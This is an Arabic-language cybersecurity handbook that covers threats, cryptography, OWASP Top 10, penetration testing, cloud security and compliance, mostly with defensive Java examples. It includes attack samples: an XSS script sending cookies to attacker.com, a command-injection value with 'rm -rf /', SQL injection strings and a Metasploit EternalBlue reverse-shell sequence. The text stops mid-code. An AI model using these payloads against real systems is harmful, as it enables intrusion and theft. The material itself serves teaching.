# دليل الأمن السيبراني الشامل

## جدول المحتويات
1. [مقدمة في الأمن السيبراني](#مقدمة-في-الأمن-السيبراني)
2. [أساسيات الأمن السيبراني](#أساسيات-الأمن-السيبراني)
3. [أنواع التهديدات السيبرانية](#أنواع-التهديدات-السيبرانية)
4. [التشفير (Cryptography)](#التشفير-cryptography)
5. [أمن الشبكات (Network Security)](#أمن-الشبكات-network-security)
6. [أمن التطبيقات (Application Security)](#أمن-التطبيقات-application-security)
7. [اختبار الاختراق (Penetration Testing)](#اختبار-الاختراق-penetration-testing)
8. [الأمان السحابي (Cloud Security)](#الأمان-السحابي-cloud-security)
9. [الامتثال والمعايير (Compliance & Standards)](#الامتثال-والمعايير-compliance--standards)
10. [أدوات الأمن السيبراني](#أدوات-الأمن-السيبراني)
11. [أفضل الممارسات](#أفضل-الممارسات)

---

## مقدمة في الأمن السيبراني

### ما هو الأمن السيبراني؟
الأمن السيبراني (Cybersecurity) هو ممارسة حماية الأنظمة والشبكات والبرامج من الهجمات الرقمية. تهدف هذه الهجمات عادةً إلى الوصول إلى المعلومات الحساسة أو تغييرها أو إتلافها، أو ابتزاز الأموال من المستخدمين، أو مقاطعة العمليات التجارية.

### أهمية الأمن السيبراني
- **حماية البيانات الحساسة**: بيانات العملاء، المعلومات المالية، الملكية الفكرية
- **الحفاظ على سمعة الشركة**: الهجمات يمكن أن تدمر الثقة
- **الامتثال القانوني**: متطلبات قانونية مثل GDPR, HIPAA
- **استمرارية الأعمال**: منع التوقف والخسائر المالية
- **الحماية من الجرائم الإلكترونية**: التصيد، البرمجيات الخبيثة، هجمات الفدية

### المبادئ الأساسية - CIA Triad

```
         السرية (Confidentiality)
                    /\
                   /  \
                  /    \
                 /  CIA \
                /________\
               /          \
              /            \
    السلامة              التوفر
   (Integrity)        (Availability)
```

#### 1. السرية (Confidentiality)
- ضمان أن المعلومات متاحة فقط للأشخاص المصرح لهم
- استخدام التشفير، التحكم في الوصول، المصادقة

#### 2. السلامة (Integrity)
- ضمان دقة واكتمال البيانات
- منع التعديل غير المصرح به
- استخدام الهاشينج، التوقيعات الرقمية

#### 3. التوفر (Availability)
- ضمان وصول المستخدمين المصرح لهم للموارد عند الحاجة
- الحماية من هجمات DDoS، النسخ الاحتياطي، التعافي من الكوارث

---

## أساسيات الأمن السيبراني

### 1. المصادقة (Authentication)
عملية التحقق من هوية المستخدم أو النظام

#### طرق المصادقة:

**أ. Something You Know (شيء تعرفه)**
```
- كلمات المرور (Passwords)
- أرقام PIN
- أسئلة الأمان
```

**ب. Something You Have (شيء تمتلكه)**
```
- البطاقات الذكية (Smart Cards)
- رموز OTP (One-Time Password)
- مفاتيح الأمان (Security Keys)
```

**ج. Something You Are (شيء أنت عليه)**
```
- بصمة الإصبع (Fingerprint)
- مسح شبكية العين (Retina Scan)
- التعرف على الوجه (Face Recognition)
```

**د. Multi-Factor Authentication (MFA)**
```
الجمع بين اثنين أو أكثر من العوامل السابقة
مثال: كلمة مرور + رمز OTP
```

### 2. التفويض (Authorization)
تحديد ما يمكن للمستخدم المصادق عليه القيام به

#### نماذج التحكم في الوصول:

**أ. Role-Based Access Control (RBAC)**
```java
// مثال في Spring Security
@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(Long userId) {
    userRepository.deleteById(userId);
}
```

**ب. Attribute-Based Access Control (ABAC)**
```
يستند إلى السمات (المستخدم، الموارد، البيئة)
مثال: السماح بالوصول فقط خلال ساعات العمل
```

**ج. Mandatory Access Control (MAC)**
```
التحكم في الوصول بناءً على تصنيف الأمان
يُستخدم في الأنظمة العسكرية والحكومية
```

### 3. المحاسبة (Accounting/Auditing)
تتبع وتسجيل أنشطة المستخدم

```java
@Component
public class AuditLogger {

    public void logAccess(String username, String resource, String action) {
        log.info("User: {}, Resource: {}, Action: {}, Time: {}",
                 username, resource, action, LocalDateTime.now());
    }
}
```

---

## أنواع التهديدات السيبرانية

### 1. البرمجيات الخبيثة (Malware)

#### أنواع البرمجيات الخبيثة:

**أ. الفيروسات (Viruses)**
```
- برنامج خبيث يرفق نفسه ببرنامج آخر
- ينتشر عند تشغيل البرنامج المصاب
- يمكن أن يحذف أو يعدل الملفات
```

**ب. الديدان (Worms)**
```
- ينتشر تلقائياً عبر الشبكة
- لا يحتاج لبرنامج مضيف
- يستهلك موارد الشبكة
```

**ج. أحصنة طروادة (Trojans)**
```
- يتنكر كبرنامج شرعي
- يفتح باب خلفي للمهاجمين
- يسرق البيانات الحساسة
```

**د. برامج الفدية (Ransomware)**
```
- يشفر ملفات الضحية
- يطلب فدية لفك التشفير
- مثال: WannaCry, Petya
```

**هـ. برامج التجسس (Spyware)**
```
- يراقب نشاط المستخدم
- يسرق المعلومات الشخصية
- يتتبع ضربات المفاتيح (Keylogger)
```

**و. برامج الإعلانات (Adware)**
```
- يعرض إعلانات غير مرغوب فيها
- قد يتتبع سلوك التصفح
```

### 2. هجمات التصيد (Phishing)

#### أنواع هجمات التصيد:

**أ. التصيد الإلكتروني (Email Phishing)**
```
- رسائل بريد إلكتروني مزيفة
- تحاول خداع المستخدم للنقر على روابط ضارة
- تطلب معلومات حساسة
```

**ب. التصيد الموجه (Spear Phishing)**
```
- هجمات مستهدفة لأفراد أو منظمات محددة
- أكثر تطوراً وشخصية
- معدل نجاح أعلى
```

**ج. صيد الحيتان (Whaling)**
```
- يستهدف المسؤولين التنفيذيين
- رسائل تبدو رسمية ومهمة
```

**د. التصيد الصوتي (Vishing)**
```
- التصيد عبر المكالمات الهاتفية
- ينتحل المهاجم شخصية موثوقة
```

**هـ. التصيد النصي (Smishing)**
```
- التصيد عبر الرسائل النصية SMS
- روابط ضارة في الرسائل
```

### 3. هجمات الحرمان من الخدمة (DDoS)

```
         ┌─────────────┐
         │   Attacker  │
         └──────┬──────┘
                │
        ┌───────┴────────┐
        │   Botnet       │
        │  (Zombies)     │
        └───────┬────────┘
                │
    ┌───────────┼───────────┐
    │           │           │
    ▼           ▼           ▼
┌────────┐  ┌────────┐  ┌────────┐
│ Server │  │ Server │  │ Server │
└────────┘  └────────┘  └────────┘
     Overwhelmed Target
```

#### أنواع هجمات DDoS:

**أ. Volume-Based Attacks**
```
- UDP Floods
- ICMP Floods
- غمر الشبكة بحركة مرور هائلة
```

**ب. Protocol Attacks**
```
- SYN Floods
- Ping of Death
- استهداف نقاط ضعف البروتوكولات
```

**ج. Application Layer Attacks**
```
- HTTP Floods
- Slowloris
- استهداف تطبيقات الويب
```

### 4. هجمات الحقن (Injection Attacks)

**أ. SQL Injection**
```sql
-- مثال ضعيف (عرضة للاختراق)
String query = "SELECT * FROM users WHERE username = '" + username + "'";

-- هجوم محتمل
username = "admin' OR '1'='1"

-- الاستعلام الناتج
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

**الحماية من SQL Injection:**
```java
// استخدام Prepared Statements
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
ResultSet rs = pstmt.executeQuery();
```

**ب. Cross-Site Scripting (XSS)**
```html
<!-- مثال على XSS -->
<script>
  // سرقة الكوكيز
  document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

**الحماية من XSS:**
```java
import org.springframework.web.util.HtmlUtils;

// تنظيف المدخلات
String sanitized = HtmlUtils.htmlEscape(userInput);
```

**ج. Command Injection**
```java
// كود ضعيف
Runtime.getRuntime().exec("ping " + userInput);

// هجوم محتمل
userInput = "8.8.8.8; rm -rf /"

// الحماية: التحقق من صحة المدخلات
if (userInput.matches("^[0-9.]+$")) {
    Runtime.getRuntime().exec("ping " + userInput);
}
```

### 5. هجمات Man-in-the-Middle (MITM)

```
    Client                  Attacker                Server
      │                        │                       │
      │──── Request ──────────>│                       │
      │                        │─── Request ──────────>│
      │                        │<─── Response ─────────│
      │<──── Response ─────────│                       │
      │                        │                       │
         (Attacker يعترض ويعدل البيانات)
```

#### الحماية من MITM:
- استخدام HTTPS/TLS
- Certificate Pinning
- VPN
- تجنب الشبكات العامة غير الآمنة

### 6. هجمات Zero-Day

```
اكتشاف الثغرة → استغلالها قبل وجود تصحيح
                      ↓
              نافذة الهجوم (Zero-Day)
                      ↓
          إصدار تصحيح أمني (Patch)
```

### 7. الهندسة الاجتماعية (Social Engineering)

#### تقنيات الهندسة الاجتماعية:

**أ. Pretexting**
```
- إنشاء سيناريو مزيف لكسب الثقة
- انتحال شخصية موظف تقنية المعلومات
```

**ب. Baiting**
```
- ترك USB مصاب في مكان عام
- الاعتماد على فضول الضحية
```

**ج. Quid Pro Quo**
```
- تقديم خدمة مقابل معلومات
- "سأساعدك في إصلاح جهازك، فقط أعطني كلمة المرور"
```

**د. Tailgating**
```
- الدخول إلى منطقة محظورة خلف شخص مصرح له
```

---

## التشفير (Cryptography)

### أنواع التشفير

#### 1. التشفير المتماثل (Symmetric Encryption)

```
     Plaintext                    Ciphertext                   Plaintext
        │                             │                            │
        │        Same Key             │         Same Key           │
        ▼                             ▼                            ▼
    ┌────────┐                   ┌────────┐                   ┌────────┐
    │Encrypt │ ────────────────> │Decrypt │ ────────────────> │ Result │
    └────────┘                   └────────┘                   └────────┘
```

**الخوارزميات الشائعة:**
- **AES (Advanced Encryption Standard)**: الأكثر استخداماً، قوي وسريع
- **DES (Data Encryption Standard)**: قديم، غير آمن
- **3DES (Triple DES)**: نسخة محسنة من DES
- **Blowfish**: سريع، مفتاح متغير الطول

**مثال AES في Java:**
```java
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class AESEncryption {

    public static byte[] encrypt(String plainText, SecretKey secretKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        return cipher.doFinal(plainText.getBytes());
    }

    public static String decrypt(byte[] cipherText, SecretKey secretKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        byte[] result = cipher.doFinal(cipherText);
        return new String(result);
    }

    public static SecretKey generateKey() throws Exception {
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
        keyGenerator.init(256); // AES-256
        return keyGenerator.generateKey();
    }
}
```

#### 2. التشفير غير المتماثل (Asymmetric Encryption)

```
     Plaintext                    Ciphertext                   Plaintext
        │                             │                            │
        │     Public Key              │      Private Key           │
        ▼                             ▼                            ▼
    ┌────────┐                   ┌────────┐                   ┌────────┐
    │Encrypt │ ────────────────> │Decrypt │ ────────────────> │ Result │
    └────────┘                   └────────┘                   └────────┘
```

**الخوارزميات الشائعة:**
- **RSA (Rivest-Shamir-Adleman)**: الأكثر شيوعاً
- **ECC (Elliptic Curve Cryptography)**: أقوى مع مفاتيح أصغر
- **DSA (Digital Signature Algorithm)**: للتوقيعات الرقمية

**مثال RSA في Java:**
```java
import java.security.*;
import javax.crypto.Cipher;

public class RSAEncryption {

    public static KeyPair generateKeyPair() throws Exception {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        return generator.generateKeyPair();
    }

    public static byte[] encrypt(String plainText, PublicKey publicKey) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        return cipher.doFinal(plainText.getBytes());
    }

    public static String decrypt(byte[] cipherText, PrivateKey privateKey) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.DECRYPT_MODE, privateKey);
        byte[] result = cipher.doFinal(cipherText);
        return new String(result);
    }
}
```

#### 3. دوال الهاش (Hash Functions)

```
   Input (Any Size)
         │
         ▼
    ┌────────┐
    │  Hash  │
    │Function│
    └────────┘
         │
         ▼
  Fixed Size Output (Hash)
```

**خصائص دوال الهاش:**
- **Deterministic**: نفس المدخل ينتج نفس المخرج
- **One-way**: لا يمكن عكسها
- **Fixed output**: حجم ثابت بغض النظر عن حجم المدخل
- **Collision resistant**: صعوبة إيجاد مدخلين ينتجان نفس الهاش

**الخوارزميات الشائعة:**
- **SHA-256**: آمن، يستخدم في Bitcoin
- **SHA-3**: الأحدث
- **MD5**: غير آمن، لا يُنصح به
- **bcrypt**: لتخزين كلمات المرور

**مثال Hashing في Java:**
```java
import java.security.MessageDigest;
import java.util.Base64;

public class HashExample {

    public static String hashPassword(String password) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] hash = md.digest(password.getBytes());
        return Base64.getEncoder().encodeToString(hash);
    }

    // استخدام bcrypt (أفضل لكلمات المرور)
    public static String hashPasswordBcrypt(String password) {
        return BCrypt.hashpw(password, BCrypt.gensalt(12));
    }

    public static boolean verifyPassword(String password, String hash) {
        return BCrypt.checkpw(password, hash);
    }
}
```

### 4. التوقيع الرقمي (Digital Signature)

```
    Document                    Signature                   Verification
        │                          │                            │
        │    Private Key           │      Public Key            │
        ▼                          ▼                            ▼
    ┌────────┐               ┌────────┐                   ┌────────┐
    │  Sign  │ ──────────────>│ Verify │ ──────────────> │Valid?  │
    └────────┘               └────────┘                   └────────┘
```

**مثال Digital Signature:**
```java
import java.security.*;

public class DigitalSignatureExample {

    public static byte[] signData(String data, PrivateKey privateKey) throws Exception {
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initSign(privateKey);
        signature.update(data.getBytes());
        return signature.sign();
    }

    public static boolean verifySignature(String data, byte[] signatureBytes,
                                         PublicKey publicKey) throws Exception {
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initVerify(publicKey);
        signature.update(data.getBytes());
        return signature.verify(signatureBytes);
    }
}
```

### 5. SSL/TLS

#### كيف يعمل TLS Handshake:

```
Client                                                Server
  │                                                     │
  │─────── ClientHello ──────────────────────────────> │
  │                                                     │
  │ <────── ServerHello + Certificate ────────────────│
  │                                                     │
  │─────── Key Exchange + Change Cipher Spec ────────> │
  │                                                     │
  │ <────── Change Cipher Spec + Finished ────────────│
  │                                                     │
  │═══════════ Encrypted Communication ═══════════════│
```

**مكونات TLS:**
1. **Encryption**: حماية البيانات أثناء النقل
2. **Authentication**: التحقق من هوية الخادم
3. **Integrity**: ضمان عدم تعديل البيانات

---

## أمن الشبكات (Network Security)

### 1. جدران الحماية (Firewalls)

#### أنواع Firewalls:

**أ. Packet Filtering Firewall**
```
- يفحص رؤوس الحزم (IP, Port, Protocol)
- قرارات بناءً على قواعد محددة
- سريع لكن محدود
```

**ب. Stateful Inspection Firewall**
```
- يتتبع حالة الاتصالات
- يتذكر الجلسات النشطة
- أكثر أماناً من Packet Filtering
```

**ج. Application Layer Firewall (WAF)**
```
- يفحص محتوى التطبيق
- يحمي من SQL Injection, XSS
- يفهم بروتوكولات HTTP, FTP
```

**د. Next-Generation Firewall (NGFW)**
```
- يجمع كل المزايا السابقة
- Deep Packet Inspection
- IPS/IDS متكامل
- Application Awareness
```

### 2. أنظمة كشف ومنع التسلل (IDS/IPS)

#### الفرق بين IDS و IPS:

```
┌─────────────────────────────────────────┐
│  IDS (Intrusion Detection System)      │
│  - يكتشف التهديدات                     │
│  - يرسل تنبيهات                        │
│  - لا يوقف الهجوم                      │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│  IPS (Intrusion Prevention System)      │
│  - يكتشف التهديدات                     │
│  - يوقف الهجمات تلقائياً               │
│  - يحجب حركة المرور الضارة            │
└─────────────────────────────────────────┘
```

#### طرق الكشف:

**أ. Signature-based Detection**
```
- يبحث عن أنماط معروفة للهجمات
- سريع ودقيق للتهديدات المعروفة
- لا يكتشف هجمات جديدة (Zero-Day)
```

**ب. Anomaly-based Detection**
```
- يتعلم السلوك الطبيعي
- يكتشف الانحرافات عن السلوك المعتاد
- يمكنه كشف هجمات جديدة
- معدل إيجابيات كاذبة أعلى
```

### 3. VPN (Virtual Private Network)

```
    Client                    Internet                    Corporate Network
      │                          │                              │
      │      Encrypted           │      Encrypted               │
      │ ════════════════════════>│════════════════════════════> │
      │      VPN Tunnel          │      VPN Gateway             │
```

#### أنواع VPN:

**أ. Remote Access VPN**
```
- يربط المستخدمين الفرديين بالشبكة
- للعمل عن بعد
- بروتوكولات: OpenVPN, L2TP/IPSec, PPTP
```

**ب. Site-to-Site VPN**
```
- يربط شبكتين كاملتين
- لربط مكاتب الشركة
- بروتوكول: IPSec
```

**ج. SSL/TLS VPN**
```
- يعمل عبر المتصفح
- لا يحتاج برامج إضافية
- سهل الاستخدام
```

### 4. Network Segmentation

```
┌──────────────────────────────────────────┐
│         DMZ (Demilitarized Zone)         │
│  ┌────────┐  ┌────────┐  ┌────────┐     │
│  │Web     │  │Email   │  │DNS     │     │
│  │Server  │  │Server  │  │Server  │     │
│  └────────┘  └────────┘  └────────┘     │
└──────────────┬───────────────────────────┘
               │ Firewall
┌──────────────┴───────────────────────────┐
│         Internal Network                 │
│  ┌────────┐  ┌────────┐  ┌────────┐     │
│  │App     │  │Database│  │File    │     │
│  │Server  │  │Server  │  │Server  │     │
│  └────────┘  └────────┘  └────────┘     │
└──────────────────────────────────────────┘
```

### 5. Network Security Protocols

**أ. IPSec (Internet Protocol Security)**
```
- يعمل على طبقة الشبكة
- يشفر ويصادق على حزم IP
- يُستخدم في VPNs
```

**ب. SSL/TLS**
```
- يعمل على طبقة التطبيق
- يؤمن HTTPS, FTPS, SMTPS
```

**ج. SSH (Secure Shell)**
```
- اتصال آمن بالخوادم
- بديل آمن لـ Telnet
- نقل ملفات آمن (SFTP, SCP)
```

---

## أمن التطبيقات (Application Security)

### 1. OWASP Top 10 (2021)

#### A01: Broken Access Control
**المشكلة:**
```java
// كود ضعيف - لا يوجد تحقق من الصلاحيات
@GetMapping("/user/{id}")
public User getUser(@PathVariable Long id) {
    return userService.findById(id);
    // أي مستخدم يمكنه الوصول لأي معرف!
}
```

**الحل:**
```java
@GetMapping("/user/{id}")
@PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
public User getUser(@PathVariable Long id) {
    return userService.findById(id);
}
```

#### A02: Cryptographic Failures
**المشكلة:**
```java
// تخزين كلمات المرور بنص واضح
user.setPassword(plainPassword); // خطأ!
```

**الحل:**
```java
// استخدام تشفير قوي
String hashedPassword = BCrypt.hashpw(plainPassword, BCrypt.gensalt(12));
user.setPassword(hashedPassword);
```

#### A03: Injection
**مثال SQL Injection:**
```java
// كود ضعيف
String query = "SELECT * FROM users WHERE email = '" + email + "'";

// الحل: Prepared Statements
String query = "SELECT * FROM users WHERE email = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, email);
```

#### A04: Insecure Design
```
- عدم تطبيق مبادئ التصميم الآمن
- عدم نمذجة التهديدات (Threat Modeling)
- عدم اتباع Secure SDLC
```

#### A05: Security Misconfiguration
**أمثلة على التكوينات الخاطئة:**
```yaml
# خطأ: تفعيل debug mode في الإنتاج
spring:
  profiles:
    active: dev
  boot:
    admin:
      client:
        enabled: true
  h2:
    console:
      enabled: true  # يجب تعطيله في الإنتاج!

# الصحيح:
spring:
  profiles:
    active: prod
  h2:
    console:
      enabled: false
```

#### A06: Vulnerable and Outdated Components
```bash
# فحص الثغرات في المكتبات
mvn dependency-check:check

# تحديث المكتبات
mvn versions:display-dependency-updates
```

#### A07: Identification and Authentication Failures
**المشاكل الشائعة:**
```
- كلمات مرور ضعيفة
- عدم استخدام MFA
- عدم حماية الجلسات
- تخزين Session IDs في URL
```

**الحل:**
```java
@Configuration
public class SecurityConfig {

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement()
                .sessionFixation().migrateSession()
                .maximumSessions(1)
                .maxSessionsPreventsLogin(true)
            .and()
            .invalidSessionUrl("/login?invalid-session=true");
        return http.build();
    }
}
```

#### A08: Software and Data Integrity Failures
```
- عدم التحقق من سلامة التحديثات
- استخدام مكتبات من مصادر غير موثوقة
- عدم استخدام التوقيعات الرقمية
```

#### A09: Security Logging and Monitoring Failures
```java
@Slf4j
@Component
public class SecurityLogger {

    public void logSecurityEvent(String event, String username, String details) {
        log.warn("SECURITY EVENT: {} | User: {} | Details: {} | Time: {}",
                 event, username, details, Instant.now());
    }

    public void logFailedLogin(String username, String ip) {
        log.error("FAILED LOGIN: User: {} | IP: {} | Time: {}",
                  username, ip, Instant.now());
    }
}
```

#### A10: Server-Side Request Forgery (SSRF)
**المشكلة:**
```java
// كود ضعيف
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) {
    return restTemplate.getForObject(url, String.class);
    // يمكن للمهاجم الوصول للموارد الداخلية!
}
```

**الحل:**
```java
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) {
    // التحقق من صحة URL
    if (!isValidUrl(url)) {
        throw new InvalidUrlException();
    }

    // قائمة بيضاء للنطاقات المسموحة
    if (!isAllowedDomain(url)) {
        throw new UnauthorizedDomainException();
    }

    return restTemplate.getForObject(url, String.class);
}

private boolean isAllowedDomain(String url) {
    List<String> allowedDomains = Arrays.asList("api.example.com", "trusted.com");
    return allowedDomains.stream().anyMatch(url::contains);
}
```

### 2. Secure Coding Practices

#### Input Validation
```java
import javax.validation.constraints.*;

public class UserDTO {

    @NotBlank(message = "Username is required")
    @Size(min = 3, max = 20)
    @Pattern(regexp = "^[a-zA-Z0-9_]+$")
    private String username;

    @NotBlank
    @Email(message = "Invalid email format")
    private String email;

    @NotBlank
    @Size(min = 8, message = "Password must be at least 8 characters")
    @Pattern(regexp = "^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%^&+=]).*$",
             message = "Password must contain uppercase, lowercase, digit and special character")
    private String password;
}
```

#### Output Encoding
```java
import org.springframework.web.util.HtmlUtils;

public String sanitizeOutput(String userInput) {
    // تنظيف HTML
    String sanitized = HtmlUtils.htmlEscape(userInput);

    // تنظيف JavaScript
    sanitized = sanitized.replace("'", "\\'")
                        .replace("\"", "\\\"");

    return sanitized;
}
```

#### Error Handling
```java
@ControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleException(Exception ex) {
        // لا تكشف تفاصيل داخلية للمستخدم
        log.error("Error occurred", ex);

        ErrorResponse error = new ErrorResponse(
            "An error occurred. Please contact support.",
            LocalDateTime.now()
        );

        return ResponseEntity
            .status(HttpStatus.INTERNAL_SERVER_ERROR)
            .body(error);
    }
}
```

---

## اختبار الاختراق (Penetration Testing)

### مراحل اختبار الاختراق

```
1. Reconnaissance (الاستطلاع)
         ↓
2. Scanning (المسح)
         ↓
3. Gaining Access (الوصول)
         ↓
4. Maintaining Access (المحافظة على الوصول)
         ↓
5. Covering Tracks (إخفاء الآثار)
         ↓
6. Reporting (التقرير)
```

### 1. Reconnaissance (الاستطلاع)

#### أنواع الاستطلاع:

**أ. Passive Reconnaissance**
```bash
# جمع معلومات دون التفاعل المباشر
# WHOIS Lookup
whois example.com

# DNS Enumeration
nslookup example.com
dig example.com ANY

# Google Dorking
site:example.com filetype:pdf
site:example.com inurl:admin
```

**ب. Active Reconnaissance**
```bash
# تفاعل مباشر مع الهدف
# Ping Sweep
nmap -sn 192.168.1.0/24

# Port Scanning
nmap -p- -T4 192.168.1.1
```

### 2. Scanning (المسح)

```bash
# Nmap - مسح المنافذ
nmap -sV -sC -O -p- 192.168.1.1

# -sV: اكتشاف الإصدارات
# -sC: تشغيل السكريبتات الافتراضية
# -O: اكتشاف نظام التشغيل
# -p-: مسح جميع المنافذ

# Vulnerability Scanning
nmap --script vuln 192.168.1.1

# Nikto - مسح خوادم الويب
nikto -h http://example.com

# OWASP ZAP - اختبار تطبيقات الويب
```

### 3. Gaining Access

#### Web Application Testing
```bash
# SQL Injection Testing
sqlmap -u "http://example.com/page.php?id=1" --dbs

# XSS Testing
# محاولة حقن:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# CSRF Testing
# التحقق من عدم وجود CSRF tokens
```

### 4. Common Penetration Testing Tools

**أ. Kali Linux Tools**
```
- Metasploit: إطار عمل الاختراق
- Burp Suite: اختبار تطبيقات الويب
- Wireshark: تحليل حركة الشبكة
- John the Ripper: كسر كلمات المرور
- Aircrack-ng: اختبار أمان WiFi
- Hashcat: كسر الهاشات
```

**ب. Metasploit Framework**
```bash
# تشغيل Metasploit
msfconsole

# البحث عن استغلال
search ms17-010

# استخدام استغلال
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.10
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
```

---

## الأمان السحابي (Cloud Security)

### 1. مبادئ أمان السحابة

#### نموذج المسؤولية المشتركة

```
┌─────────────────────────────────────────────┐
│        Customer Responsibility              │
│  ┌─────────────────────────────────────┐   │
│  │  Data                                │   │
│  │  Applications                        │   │
│  │  Access Management                   │   │
│  │  Operating System (IaaS)             │   │
│  └─────────────────────────────────────┘   │
└─────────────────────────────────────────────┘
┌─────────────────────────────────────────────┐
│        Provider Responsibility              │
│  ┌─────────────────────────────────────┐   │
│  │  Physical Security                   │   │
│  │  Network Infrastructure              │   │
│  │  Hypervisor                          │   │
│  │  Storage                             │   │
│  └─────────────────────────────────────┘   │
└─────────────────────────────────────────────┘
```

### 2. AWS Security Best Practices

**أ. IAM (Identity and Access Management)**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "203.0.113.0/24"
        }
      }
    }
  ]
}
```

**ب. S3 Bucket Security**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyInsecureTransport",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
```

**ج. VPC Security**
```
- استخدام Security Groups
- Network ACLs
- Private Subnets للموارد الحساسة
- VPC Flow Logs للمراقبة
```

### 3. Container Security

**أ. Docker Security**
```dockerfile
# استخدام صور رسمية وموثوقة
FROM node:18-alpine

# تشغيل كمستخدم غير root
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001

USER nodejs

# عدم تضمين أسرار في الصورة
# استخدام Docker secrets أو environment variables
```

**ب. Kubernetes Security**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
```

---

## الامتثال والمعايير (Compliance & Standards)

### 1. ISO 27001
```
معيار دولي لنظام إدارة أمن المعلومات (ISMS)

المتطلبات الرئيسية:
- تقييم المخاطر
- سياسات الأمن
- التحكم في الوصول
- التشفير
- الأمن المادي
- إدارة الحوادث
- استمرارية الأعمال
```

### 2. PCI DSS (Payment Card Industry Data Security Standard)
```
12 متطلب رئيسي:
1. تثبيت وصيانة جدار حماية
2. عدم استخدام كلمات مرور افتراضية
3. حماية بيانات حاملي البطاقات
4. تشفير نقل بيانات حاملي البطاقات
5. استخدام برامج مكافحة الفيروسات
6. تطوير وصيانة أنظمة آمنة
7. تقييد الوصول للبيانات
8. تعيين معرف فريد لكل مستخدم
9. تقييد الوصول المادي
10. تتبع ومراقبة الوصول للموارد
11. اختبار أنظمة الأمان بانتظام
12. الحفاظ على سياسة أمن المعلومات
```

### 3. GDPR (General Data Protection Regulation)
```
المبادئ الأساسية:
- الشفافية في جمع البيانات
- الحد من الغرض (Purpose Limitation)
- تقليل البيانات (Data Minimization)
- الدقة (Accuracy)
- الحد من التخزين (Storage Limitation)
- السلامة والأمان (Integrity and Confidentiality)
- المساءلة (Accountability)

حقوق الأفراد:
- الحق في الوصول
- الحق في التصحيح
- الحق في المحو (Right to be Forgotten)
- الحق في نقل البيانات
```

---

## أدوات الأمن السيبراني

### 1. Security Information and Event Management (SIEM)

**أمثلة:**
```
- Splunk
- IBM QRadar
- ArcSight
- ELK Stack (Elasticsearch, Logstash, Kibana)
```

**مثال تكوين Logstash:**
```ruby
input {
  file {
    path => "/var/log/auth.log"
    type => "auth"
  }
}

filter {
  if [type] == "auth" {
    grok {
      match => { "message" => "%{SYSLOGBASE} Failed password for %{USER:username}" }
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "security-logs-%{+YYYY.MM.dd}"
  }
}
```

### 2. Vulnerability Scanners

```bash
# OpenVAS
openvas-start
openvasmd --create-user=admin --password=admin123

# Nessus
/opt/nessus/sbin/nessus-service

# OWASP Dependency Check
mvn org.owasp:dependency-check-maven:check
```

### 3. Web Application Firewalls (WAF)

**ModSecurity Rules:**
```apache
# حماية من SQL Injection
SecRule REQUEST_URI|ARGS "@rx (?i)(union.*select|insert.*into)" \
    "id:1000,phase:2,block,status:403,msg:'SQL Injection Detected'"

# حماية من XSS
SecRule ARGS "@rx <script" \
    "id:1001,phase:2,block,status:403,msg:'XSS Attack Detected'"
```

---

## أفضل الممارسات

### 1. للمطورين

```java
// ✅ استخدام Parameterized Queries
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setLong(1, userId);

// ✅ تشفير البيانات الحساسة
String encrypted = AES.encrypt(sensitiveData, secretKey);

// ✅ التحقق من صحة المدخلات
@Valid @RequestBody UserDTO userDTO

// ✅ استخدام HTTPS فقط
server.ssl.enabled=true

// ✅ تفعيل Security Headers
http.headers()
